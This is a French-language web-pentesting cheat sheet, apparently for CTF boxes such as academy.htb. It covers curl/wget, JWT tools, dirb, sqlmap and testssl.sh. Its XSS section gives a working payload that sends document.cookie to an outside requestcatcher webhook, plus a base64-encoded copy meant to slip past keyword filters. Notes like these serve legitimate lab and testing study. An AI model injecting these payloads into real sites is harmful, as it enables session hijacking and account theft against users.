# Web

- [Curl](#curl)
- [JWT (Json Web Token)](#jwt-json-web-token)
- [API](#api)
- [Obfuscation Javascript](#obfuscation-javascript)
- [XSS (Cross Site Scripting)](#xss-cross-site-scripting)
- [Scan d'URL web](#scan-durl-web)
- [Injection SQL](#injection-sql)
- [TLS](#tls)

## Curl / Wget

```bash
# ajouter un header à la requête
curl http://10.10.10.215 -H host:academy.htb
```

Pour obtenir la version hors-ligne d'un site :
```bash
# version longue
wget -r -l1 --page-requisite --convert-links --adjust-extension --timestamping <--span-hosts> url
# version courte
wget -r -l1 -p -k -E -N <-H> url
```

## JWT (Json Web Token)

Pour manipuler un JWT en ligne : https://jwt.io/

Pour manipuler un JWT en python : https://pyjwt.readthedocs.io/en/latest/

## API

Pour requêter une API : https://reqbin.com

## Obfuscation Javascript

Outil pour obfusquer du Javascript : http://dean.edwards.name/packer

Outil pour dé-obfusquer du Javascript : https://lelinhtinh.github.io/de4js

## XSS (Cross Site Scripting)

```html
// Pour tester
<p id="p1">Testarossa</p>
<script>
document.getElementById("p1").innerHTML = "Life found a way !";
</script>
```

Webhook : https://busterbaxter.requestcatcher.com
```html
// Pour exploiter
<script>
var script = document.createElement("script");
script.src = "https://busterbaxter.requestcatcher.com/" + document.cookie;
document.body.appendChild(script);
</script>:-)

// Pour bypass les filtres qui recherchent des mots clés : base64 encoded payload
<body onload="eval(atob('dmFyIHNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpO3NjcmlwdC5zcmMgPSAiaHR0cHM6Ly9idXN0ZXJiYXh0ZXIucmVxdWVzdGNhdGNoZXIuY29tLyIgKyBkb2N1bWVudC5jb29raWU7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzY3JpcHQpOw=='))">
```

## Scan d'URL web

>Attention ! Ne pas utiliser en CTF réaliste
```bash
dirb http://10.10.10.215 -r -o academy.dirb.txt -H host:academy.htb
```

## Injection SQL

https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet

```bash
# à partir d'une url
sqlmap -u "http://academy.htb/admin.php?uid=0&password=0" #--level 5 --risk 3
# à partir d'une requête interceptée par burpsuite
sqlmap -r academy.burp.txt
```

## TLS

`testssl.sh` permet de tester :
- versions de SSL/TLS
- suites de chiffrement
- ordre de chiffrement
- certificat
- vulnérabilités connues

Pour lancer :
```bash
git clone --depth 1 https://github.com/drwetter/testssl.sh.git
cd testssl.sh
./testssl.sh --html 172.17.0.2:50051
```
